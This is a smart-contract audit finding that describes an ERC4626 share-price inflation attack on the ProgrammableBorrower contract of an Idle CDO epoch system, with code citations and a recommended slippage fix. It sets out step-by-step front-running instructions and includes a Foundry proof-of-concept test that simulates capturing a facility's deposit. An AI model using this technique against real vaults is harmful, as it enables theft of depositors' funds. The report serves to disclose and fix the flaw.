### Title
ERC4626 vault share-price inflation can steal all funds deposited at epoch start - ([File: contracts/strategies/idle/ProgrammableBorrower.sol](contracts/strategies/idle/ProgrammableBorrower.sol))

### Summary
`ProgrammableBorrower` deposits all idle underlying into a permissionless ERC4626 vault without validating the number of shares returned. If the vault is empty or economically capturable, an attacker can front-run the epoch start with a deposit-plus-donation inflation attack, cause the facility to receive zero or dust shares, and redeem the donated and deposited assets for a direct profit. [1](#0-0) [2](#0-1) 

### Finding Description
`IdleCDOEpochVariant.startEpoch` transfers surplus underlying to the borrower adapter and invokes the programmable-borrower start hook. [3](#0-2)  `ProgrammableBorrower.onStartEpoch` snapshots the facility's total assets, including raw underlying, before calling `_depositToVault`. [4](#0-3)  `_depositToVault` calls `vault.deposit(_assetAmount, address(this))` but does not preview the deposit, enforce a minimum number of shares, or revert when zero shares are minted. [2](#0-1) 

In the buffer phase, an attacker who is allowed to use the configured ERC4626 vault can:

1. Deposit `1 wei` into a fresh or nearly empty vault and receive one share.
2. Donate enough underlying so the vault's assets per share exceed the facility's pending deposit.
3. Let the honest owner or manager execute `startEpoch`.
4. The facility deposits its full idle balance but mints zero shares because `depositAmount * totalSupply / totalAssets == 0`.
5. The attacker redeems their share for the vault's full balance, capturing the facility's deposit.

The facility's subsequent vault valuation is zero because `_currentVaultAssets` converts its share balance rather than tracking historical contributions. [5](#0-4)  Epoch accounting consequently records a loss equal to the deposited principal, while `onStopEpoch` cannot withdraw the missing liquidity. [6](#0-5) [7](#0-6) 

### Impact Explanation
The attacker can steal substantially all idle principal passed through a vulnerable deposit. For example, with a facility deposit of `1,000,000` tokens, an attacker can create a one-share vault position, donate `1,000,000` tokens, cause the facility's deposit to mint zero shares, and redeem approximately `2,000,000` tokens. The result is about `1,000,000` tokens of direct LP loss and a vault loss equal to the facility's epoch principal. This breaks solvency and fair allocation of deposits because assets counted in `epochStartVaultAssets` no longer correspond to owned vault shares. [1](#0-0) [6](#0-5) 

### Likelihood Explanation
Likelihood is conditional on the configured ERC4626 vault being permissionless, having low initial supply or an economically manipulable exchange rate, and permitting deposits that mint zero or economically negligible shares. The attacker needs to front-run only the honest `startEpoch` transaction and does not need control over `ProgrammableBorrower`, the borrower, owner, or manager. Existing donation skimming occurs inside the CDO and does not inspect assets donated to the external vault; reentrancy protection and honest privileged callers do not prevent transaction ordering. [8](#0-7) [9](#0-8)  The issue is not exploitable against a vault with sufficient uncontrolled supply, inflation-resistant share accounting, or a deposit implementation that reverts on zero shares.

### Recommendation
Before every ERC4626 deposit, calculate expected shares using the vault's `previewDeposit` or `convertToShares` interface and require a caller/operator-configured minimum acceptable amount. At minimum:

```solidity
uint256 expectedShares = vault.previewDeposit(_assetAmount);
uint256 minShares = expectedShares * (FULL_ALLOC - maxVaultDepositSlippage) / FULL_ALLOC;
uint256 shares = vault.deposit(_assetAmount, address(this));
if (shares < minShares || shares == 0) revert SlippageExceeded();
```

Use an equivalent maximum-shares check around `withdraw`/`redeem` calls. Only configure ERC4626 vaults with permissionless-deposit inflation protections or bootstrap them atomically during facility initialization. [2](#0-1) [10](#0-9) 

### Proof of Concept
The following Foundry test can be placed at `test/foundry/ProgrammableBorrowerVaultInflation.t.sol`. It runs on a fork and demonstrates the ERC4626 rounding/donation condition that makes `ProgrammableBorrower` accept `1 ether` while minting zero shares.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import {ProgrammableBorrower} from "../../contracts/strategies/idle/ProgrammableBorrower.sol";

contract TestAsset is ERC20 {
    constructor() ERC20("Underlying", "UND") {}
    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract InflatableERC4626 is ERC20 {
    TestAsset public immutable assetToken;

    constructor(TestAsset _asset) ERC20("Vault Share", "vUND") {
        assetToken = _asset;
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function totalAssets() public view returns (uint256) {
        return assetToken.balanceOf(address(this));
    }

    function convertToShares(uint256 assets) public view returns (uint256) {
        uint256 supply = totalSupply();
        return supply == 0 ? assets : assets * supply / totalAssets();
    }

    function convertToAssets(uint256 shares) public view returns (uint256) {
        uint256 supply = totalSupply();
        return supply == 0 ? 0 : shares * totalAssets() / supply;
    }

    function deposit(uint256 assets, address receiver) external returns (uint256 shares) {
        shares = convertToShares(assets);
        assetToken.transferFrom(msg.sender, address(this), assets);
        _mint(receiver, shares);
    }

    function withdraw(uint256 assets, address receiver, address owner)
        external
        returns (uint256 shares)
    {
        shares = (assets * totalSupply() + totalAssets() - 1) / totalAssets();
        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }

    function redeem(uint256 shares, address receiver, address owner)
        external
        returns (uint256 assets)
    {
        assets = convertToAssets(shares);
        _burn(owner, shares);
        assetToken.transfer(receiver, assets);
    }
}

contract CDOStub {
    address public immutable token;
    constructor(address _token) {
        token = _token;
    }

    function start(ProgrammableBorrower borrower) external {
        borrower.onStartEpoch(0);
    }
}

contract ProgrammableBorrowerVaultInflationTest is Test {
    uint256 constant DEPOSIT = 1_000_000 ether;

    TestAsset asset;
    InflatableERC4626 vault;
    CDOStub cdo;
    ProgrammableBorrower borrower;

    address attacker = address(0xA77ACC);
    address owner = address(0x1111);
    address manager = address(0x2222);
    address realBorrower = address(0x3333);

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"));

        asset = new TestAsset();
        vault = new InflatableERC4626(asset);
        cdo = new CDOStub(address(asset));

        borrower = new ProgrammableBorrower();
        borrower.initialize(
            address(vault),
            address(cdo),
            owner,
            manager,
            realBorrower,
            0
        );
    }

    function test_StartEpochVaultDepositCanBeCaptured() public {
        asset.mint(attacker, DEPOSIT + 1);
        asset.mint(address(borrower), DEPOSIT);

        // Seed the vault with one share, then inflate assets/share above DEPOSIT.
        vm.startPrank(attacker);
        asset.approve(address(vault), type(uint256).max);
        vault.deposit(1, attacker);
        asset.transfer(address(vault), DEPOSIT);
        vm.stopPrank();

        // The honest epoch start deposits all idle funds but receives zero shares.
        vm.prank(address(cdo));
        cdo.start(borrower);

        assertEq(vault.balanceOf(address(borrower)), 0);
        assertEq(borrower.vaultSharesBalance(), 0);
        assertEq(borrower.vaultLoss(), DEPOSIT);

        // The single attacker share owns both the donation and borrower deposit.
        uint256 before = asset.balanceOf(attacker);
        vm.prank(attacker);
        vault.redeem(1, attacker, attacker);

        assertEq(asset.balanceOf(attacker) - before, (DEPOSIT * 2) + 1);
        assertEq(vault.balanceOf(attacker), 0);
    }
}
```

Run with:

```bash
forge test \
  --match-test test_StartEpochVaultDepositCanBeCaptured \
  --fork-url "$ETH_RPC_URL" \
  -vvv
```

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L198-219)
```text
  /// @notice Hook called by IdleCDOEpochVariant when a new epoch starts.
  /// It deposits all on-hand assets into the vault and starts accounting.
  /// @param _pendingWithdraws pending withdraw requests amount to reserve for epoch end.
  function onStartEpoch(uint256 _pendingWithdraws) external nonReentrant {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L239-252)
```text
    uint256 onHand = underlyingToken.balanceOf(address(this));
    if (_amountRequired > onHand) {
      uint256 shortfall = _amountRequired - onHand;
      // If the vault shares do not economically cover the shortfall, let IdleCDO's later
      // transferFrom fail and use the existing default path. Only an otherwise-covered ERC4626
      // withdrawal failure should make stopEpoch retryable.
      if (shortfall > _currentVaultAssets()) return true;
      try vault.withdraw(shortfall, address(this), address(this)) returns (uint256 shares) {
        if (epochAccountingActive) {
          epochWithdrawnFromVault += shortfall;
        }
        emit WithdrawnFromVault(shortfall, shares, address(this));
      } catch {
        revert StopEpochVaultLiquidityUnavailable();
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L337-345)
```text
  function _vaultNetInterest() internal view returns (uint256 interest, uint256 loss) {
    if (!epochAccountingActive) return (0, 0);
    uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
    uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
    int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
    if (netDelta > 0) {
      interest = uint256(netDelta);
    } else {
      loss = uint256(-netDelta);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L378-384)
```text
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L545-548)
```text
  /// @notice Convert the current vault share position into underlying terms.
  function _currentVaultAssets() internal view returns (uint256) {
    uint256 shares = vault.balanceOf(address(this));
    return shares == 0 ? 0 : vault.convertToAssets(shares);
```

**File:** contracts/IdleCDOEpochVariant.sol (L233-243)
```text
  function startEpoch() external {
    _checkOnlyOwnerOrManager();

    // Check that buffer period passed (and epoch is not running as epochEndDate is set)
    // and that the pool is not closed (ie epochDuration == 0)
    uint256 _epochDuration = epochDuration; 
    _checkNotAllowed(defaulted || block.timestamp < (epochEndDate + bufferPeriod) || _epochDuration == 0);
    _checkProgrammableBorrowerMode();
    // Remove raw donated underlyings before calculating epoch interest or borrower transfer amounts.
    _skimDonatedAssets();

```

**File:** contracts/IdleCDOEpochVariant.sol (L280-297)
```text
    uint256 totUnderlyings = _contractTokenBalance(token);
    uint256 _pendingWithdraws = _strategy.pendingWithdraws();
    _strategy.collectInstantWithdrawFunds(pendingInstant > totUnderlyings ? totUnderlyings : pendingInstant);

    // if there are more requests than the current underlyings we simply send all underlyings
    // to the IdleCreditVault contract
    if (pendingInstant > totUnderlyings) {
      // if borrower is programmable, notify epoch start even if no funds were sent
      _startEpochProgrammableBorrower(_pendingWithdraws);
      return;
    }
    // allow instant withdraws right away without waiting for the deadline
    allowInstantWithdraw = true;
    // and transfer the surplus to the borrower
    uint256 _toBorrower = totUnderlyings - pendingInstant;
    try this.sendFundsToBorrower(_toBorrower) {
      // funds transferred correctly
      _startEpochProgrammableBorrower(_pendingWithdraws);
```
